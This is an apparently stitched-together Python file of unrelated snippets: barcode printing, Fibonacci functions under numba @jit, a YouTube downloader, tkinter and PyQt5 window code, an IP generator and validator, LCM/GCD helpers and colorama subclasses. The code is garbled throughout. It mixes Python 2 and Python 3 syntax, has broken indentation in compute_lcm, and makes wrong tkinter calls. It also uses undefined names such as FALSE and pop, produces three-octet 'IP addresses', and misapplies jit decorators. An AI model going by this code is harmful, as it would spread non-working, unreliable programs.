            print("detected barcode:\t", obj)
            image = draw_barcode(obj, image)
            # print barcode type & data
            print("Type:\t", obj.type)
            print("Data:\t", obj.data)
class fib_class:
    @jit(nopython = True, fastmath = True)
    def fib(n):
        a, b = 0, 1
        while a < n:
            print(a, end=' ')
            a, b = b, a+b
        print()
    @jit(nopython = True, fastmath = True)
    def fib2(n):
        SQRT5 = math.sqrt(5)
        PHI = (SQRT5 + 1) / 2
        return int(PHI ** n / SQRT5 + 0.5)
    @jit(nopython = True, fastmath = True)
    def fibonacci(n):
        if n in (1, 2):
            return 1
        return fibonacci(n - 1) + fibonacci(n - 2)
def video_downloader_YouTube(video_url):
    from pytube import YouTube
    # passing the url to the YouTube object
    my_video = YouTube(video_url)
    # downloading the video in high resolution
    my_video.streams.get_highest_resolution().download()
    # return the video title
    return my_video.title
def window(Title, geometry):
	import tkinter
	from tkinter import ttk
	if Title == '':
            Title = 'unetitled'
	if geometry == '':
            geometry = '80*24'
	window = tkinter.Tk()
	window.tkinter.title(Title)
	window.tkinter.geometry(geometry)
	window.resizable(height=FALSE, width=FALSE)
	window.mainloop()
	try:
            window.mainloop()
        except:
            print('The window " ' + Title + ' " OPEN')
@jit(nopython = True, fastmath = True)
def random_ip():
    from random import randint
    return str(randint(0, 200))+'.'+str(randint(0, 200))+'.'+str(randint(0, 200))+''
colors = [Fore.BLUE, Fore.CYAN, Fore.GREEN, Fore.LIGHTBLACK_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTCYAN_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX, Fore.LIGHTYELLOW_EX, Fore.MAGENTA, Fore.RED, Fore.WHITE, Fore.YELLOW, Back.BLACK, Back.RED, Back.GREEN, Back.YELLOW, Back.BLUE, Back.MAGENTA, Back.CYAN, Back.WHITE, Back.RESET]
Style = [Style.DIM, Style.NORMAL, Style.BRIGHT, Style.RESET_ALL]
@jit(nopython = True)
def Check_Ip(ip):
    import ipaddress
    try:
        ipaddress.ip_address(ip)
        return True
    except:
        return False
class Entity(dict):
    def __getattr__(self, key):
        try: 
             return self[key]
        except KeyError, k:
             raise AttributeError, k
    def __setattr__(self, key, value):
        self[key] = value

    def __delattr__(self, key):
        try:
            del self[key]
        except KeyError, k: 
            raise AttributeError, k

    def __repr__(self):
        return self.__class__.__name__ + "(" + dict.__repr__(self) + ")"
#!/usr/bin/python3
# -*- coding: utf-8 -*- #
from PyQt5.QtWidgets import QWidget, QApplication
from PyQt5.QtGui import QPainter, QColor, QPen
from PyQt5.QtCore import Qt


class widget(QWidget):

    def __init__(self):
        super().__init__()

        self.initUI()


    def initUI(self):

        self.setGeometry(300, 300, 280, 170)
        self.setWindowTitle('Points')
        self.show()


    def paintEvent(self, e):

        qp = QPainter()
        qp.begin(self)
        self.drawPoints(qp)
        qp.end()


    def drawPoints(self, qp):

        qp.setPen(Qt.red)
        size = self.size()

        for i in range(1000):
            x = random.randint(1, size.width()-1)
            y = random.randint(1, size.height()-1)
            qp.drawPoint(x, y)
def compute_lcm(x, y):
    if x > y:
        greater = x
   else:
        greater = y
    while True:
        if((greater % x == 0) and (greater % y == 0)):
            lcm = greater
            break
        greater += 1
    return lcm
def compute_gcd(x, y):
    while(y):
        x, y = y, x % y
    return x
def print_factors(x):
    print("The factors of",x,"are:")
    for i in range(1, x + 1):
        if x % i == 0:
            print(i)
import colorama
class fore(colorama.Fore):
    pass
class style(colorama.Style):
    pass
class back(colorama.Back):
    pass
def greet(name):
  return lambda: "Hi " + name[1].upper() + pop(name[0])
#The end.
